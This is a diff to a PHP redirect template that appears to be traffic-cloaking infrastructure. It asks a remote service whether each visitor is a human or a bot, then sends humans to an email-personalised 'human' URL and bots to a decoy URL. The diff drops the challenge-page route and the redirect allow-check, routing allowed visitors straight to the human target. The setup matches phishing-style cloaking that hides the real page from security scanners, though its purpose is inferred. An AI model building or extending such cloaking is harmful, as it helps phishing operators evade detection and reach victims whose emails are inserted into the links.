@@ -106,7 +106,6 @@ $profile_name = '${phpEscape(profile.name)}';
 $build_tag = '${EXPORT_BUILD_TAG}';
 $human_url = '${humanUrl}';
 $bot_url = '${botUrl}';
-$challenge_url = '${challengeUrl}';
 $assess_url = '${assessUrl}';
 $assess_resolve_ip = '${assessResolveIp}';
 
@@ -121,27 +120,6 @@ function darkspa_apply_email_template($url, $email) {
     ['*' . $raw, $raw, '*' . $raw, $encoded, $raw, $encoded, $raw, $encoded],
     $base
   );
-}
-
-function darkspa_build_challenge_url($challengeUrl, $humanUrl, $botUrl, $email, $origin = '') {
-  $base = trim((string)$challengeUrl);
-  if ($base === '') return darkspa_apply_email_template((string)$botUrl, $email);
-
-  $pass = darkspa_apply_email_template((string)$humanUrl, $email);
-  $fail = darkspa_apply_email_template((string)$botUrl, $email);
-  $joiner = (strpos($base, '?') !== false) ? '&' : '?';
-
-  return $base
-    . $joiner . 'pass=' . rawurlencode($pass)
-    . '&fail=' . rawurlencode($fail)
-    . '&origin=' . rawurlencode((string)$origin)
-    . '&build=' . rawurlencode('${EXPORT_BUILD_TAG}');
-}
-
-function darkspa_redirect_allowed_for_action($action, $redirect) {
-  $value = trim((string)$redirect);
-  if ($value === '') return false;
-  return in_array($action, ['block', 'challenge'], true);
 }
 
 function darkspa_get_client_ip() {
@@ -236,9 +214,7 @@ $payload = [
 
 $human_target = darkspa_apply_email_template($human_url, $known_email);
 $bot_target = darkspa_apply_email_template($bot_url, $known_email);
-$page_origin = $host ? ($scheme . '://' . $host) : '';
-$challenge_target = darkspa_build_challenge_url($challenge_url, $human_url, $bot_url, $known_email, $page_origin);
-$target = $challenge_target;
+$target = $bot_target;
 
 if (!empty($assess_url)) {
   $ch = curl_init($assess_url);
@@ -283,19 +259,14 @@ if (!empty($assess_url)) {
       $json = json_decode($response, true);
       if (is_array($json)) {
         $action = strtolower((string)($json['action'] ?? ''));
-        $redirect = trim((string)($json['redirectUrl'] ?? ''));
-        $trusted_redirect = darkspa_redirect_allowed_for_action($action, $redirect) ? $redirect : '';
-
-        if ($action === 'block') {
-          $target = ($trusted_redirect !== '') ? $trusted_redirect : $bot_target;
-        } elseif ($action === 'challenge') {
-          $target = ($trusted_redirect !== '') ? $trusted_redirect : $challenge_target;
-        } elseif ($action === 'allow') {
-          $target = $challenge_target;
+          if ($action === 'allow') {
+            $target = $human_target;
+          } elseif ($action === 'block' || $action === 'challenge') {
+            $target = $bot_target;
         } else {
           $allow = !empty($json['allow']);
           if ($allow) {
-            $target = $challenge_target;
+              $target = $human_target;
           }
         }
       }
